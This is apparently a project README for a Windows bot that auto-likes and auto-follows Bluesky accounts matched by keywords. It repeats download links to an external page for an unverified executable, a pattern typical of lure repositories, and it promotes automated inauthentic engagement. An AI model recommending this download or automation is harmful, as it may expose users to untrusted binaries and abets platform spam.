# bluesky-social-bot v2.6 - social media automation 2026

> **bluesky-social-bot is a lightweight Windows utility for organized Bluesky engagement. Version 2.6 combines keyword filtering with automated likes, follows, scheduling, and activity records.**

[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2.6-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/bencmsreed2223/bluesky-social-bot-v26?style=flat-square)](https://github.com/bencmsreed2223/bluesky-social-bot-v26)

---

<p align="center">
  <a href="https://bencmsreed2223.github.io/bluesky-social-bot-v26/">
    <img src="https://img.shields.io/badge/Download-bluesky--social--bot%20Latest-brightgreen?style=for-the-badge" alt="Download bluesky-social-bot">
  </a>
</p>

> **[Download bluesky-social-bot v2.6](https://bencmsreed2223.github.io/bluesky-social-bot-v26/)**

---

[Download Latest Build](https://bencmsreed2223.github.io/bluesky-social-bot-v26/)

---

## Overview

For Windows users managing recurring Bluesky engagement work, bluesky-social-bot provides a small and focused automation tool. Its keyword matching system helps identify relevant posts and profiles without requiring constant manual review.

The application can remain out of the way while running through the system tray. Scheduling, per-session activity limits, cooldown periods, and timestamped logs provide a more controlled workflow and make it possible to inspect completed actions afterward.

---

## Included Capabilities

- Match posts and profiles against selected keywords
- Automatically like content that meets the target criteria
- Automatically follow accounts identified by the matching rules
- Run tasks on a schedule in the background
- Set a maximum number of actions for each session
- Add cooldown periods between actions
- Operate from the system tray instead of the main desktop view
- Record actions with timestamps for later inspection

---

## Getting Started

1. Download or clone the repository contents onto a Windows computer.
2. Open the project directory, or copy the build to a location where it can remain available.
3. Start the application through the supplied executable or startup entry, based on the distribution package in use.

When running from source, load the project in a compatible environment and use the build or launch guidance supplied with the release.

---

## How to Use It

A normal setup sequence looks like this:

1. Enter the keywords the bot should monitor.
2. Select the responses to perform when content matches, including likes and follows.
3. Configure the session maximum and cooldown duration.
4. Turn on scheduling when runs should occur at defined times.
5. Minimize the application to the system tray during operation.
6. Inspect the timestamped records to review recent activity.

For example:

- Enter the keywords you want to target.
- Begin a scheduled session.
- Allow the bot to watch for matching Bluesky activity.
- Check the log once the session has ended.

---

## Settings

The application generally provides its configuration controls internally. These settings cover keyword criteria, enabled actions, scheduling, session limits, and cooldown intervals.

A representative configuration may look like this:

    keywords:
      - bluesky
      - creator
      - open source
    actions:
      like: true
      follow: true
    schedule:
      enabled: true
      interval: daily
    limits:
      session_max: 25
      cooldown_seconds: 45

For distributions that save preferences locally, manage them through the application's settings area or consult the files included in the release package.

---

## System Requirements

- Windows system
- Access to the Bluesky platform
- Sufficient local storage for application files and logs
- A suitable runtime or packaging environment when building from source
- A standard desktop session for system tray operation

---

## Frequently Asked Questions

**How can I modify what the bot does?**  
Change the keyword entries, action switches, and activity limits in the application configuration.

**Does the application need to remain visible?**  
No. It is designed to operate from the system tray during scheduled and background sessions.

**How can I review previous activity?**  
Open the timestamped logs to see which actions occurred and when they were performed.

**Why is no content being matched?**  
Check the keyword list, matching rules, session limits, and cooldown values to confirm that they correspond to the content you want to target.

**Where can I find newer versions?**  
Download the newest build from the project link and consult the release notes for the changes included in that version.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
